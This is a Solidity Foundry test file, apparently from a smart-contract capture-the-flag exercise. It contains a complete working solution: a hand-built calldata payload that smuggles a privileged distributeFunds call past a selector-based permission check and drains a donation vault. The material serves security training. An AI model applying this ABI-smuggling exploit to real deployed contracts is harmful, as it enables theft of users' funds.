// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PermissionedDonationVault} from "../../src/abi-smuggling/abi-smuggling-v2/PermissionedDonationVault.sol";

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";


contract DonationChallengeTest is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address beneficiary = makeAddr("beneficiary");
    
    MockERC20 donationToken;
    PermissionedDonationVault vault;
    
    uint256 constant INITIAL_BALANCE = 1_000_000e18;
    uint256 constant COOLDOWN_PERIOD = 7 days;

    function setUp() public {
        vm.startPrank(deployer);
        
        // Deploy token and mint initial supply
        donationToken = new MockERC20("Donation Token", "DON", 18);
        donationToken.mint(deployer, INITIAL_BALANCE);
        
        // Deploy vault
        vault = new PermissionedDonationVault(COOLDOWN_PERIOD);
        
        // Set up roles
        //vault.grantRole(deployer, vault.ADMIN_ROLE());
        vault.grantRole(player, vault.DONOR_ROLE());
        
        // Fund vault
        donationToken.transfer(address(vault), INITIAL_BALANCE);
        
        vm.stopPrank();
    }

    function test_challenge() public {
        vm.startPrank(player);
        
        // TODO: Implement your solution here
        // Goal: Extract all funds from the vault to the beneficiary address
        // despite only having DONOR_ROLE
        // 4 32 possition
               // Step 1: Create function selectors
        bytes4 executeSelector = bytes4(keccak256("executeAction(address,bytes)"));
        bytes4 donateSelector = bytes4(keccak256("donate(address,uint256)")); // This will be our dummy selector
        bytes4 distributeSelector = bytes4(keccak256("distributeFunds(address,address)")); // This is what we actually want to call
        
        // Step 2: Create the component parts of our payload
        // Target address (vault)
        bytes memory targetAddress = abi.encode(address(vault));
        
        // Offset for where our actual data begins (0x80 = 128 bytes)
        bytes memory dataLocation = abi.encode(0x80);
        
        // Empty bytes where length should be
        bytes memory emptyBytes = abi.encode(0x0);
        
        // Padding after donate selector
        bytes memory padding = new bytes(28); // 28 bytes of padding
        
        // Length of actual data (4 bytes selector + 2 * 32 bytes parameters = 68 bytes = 0x44)
        bytes memory dataLength = abi.encode(0x44);
        
        // Parameters for distributeFunds
        bytes memory distributeParams = abi.encode(address(donationToken), beneficiary);
        
        // Step 3: Construct the full payload
        bytes memory payload = bytes.concat(
            executeSelector,                  // 0x00-0x04: executeAction selector
            targetAddress,                    // 0x04-0x24: vault address
            dataLocation,                     // 0x24-0x44: offset to real data (points to 0x80)
            emptyBytes,                       // 0x44-0x64: empty bytes where length should be
            donateSelector,                   // 0x64-0x68: donate selector (this gets checked)
            padding,                          // 0x68-0x84: padding after donate selector
            dataLength,                       // 0x84-0xA4: length of real data
            distributeSelector,               // 0xA4-0xA8: distributeFunds selector (what actually gets called)
            distributeParams                  // 0xA8-0xE8: parameters for distributeFunds
        );
        
        // Step 4: Warp time to bypass cooldown
        vm.warp(block.timestamp + COOLDOWN_PERIOD + 1);
        
        // Step 5: Execute the attack
        (bool success,) = address(vault).call(payload);
        require(success, "Attack failed");

        vm.stopPrank();
        
        // Verify solution
        assertEq(donationToken.balanceOf(address(vault)), 0, "Vault should be empty");
        assertEq(donationToken.balanceOf(beneficiary), INITIAL_BALANCE, "Beneficiary should have all funds");
    }
}



contract MockERC20 is ERC20 {
    uint8 private _decimals;

    constructor(
        string memory name,
        string memory symbol,
        uint8 decimals_
    ) ERC20(name, symbol) {
        _decimals = decimals_;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function burn(address from, uint256 amount) external {
        _burn(from, amount);
    }
}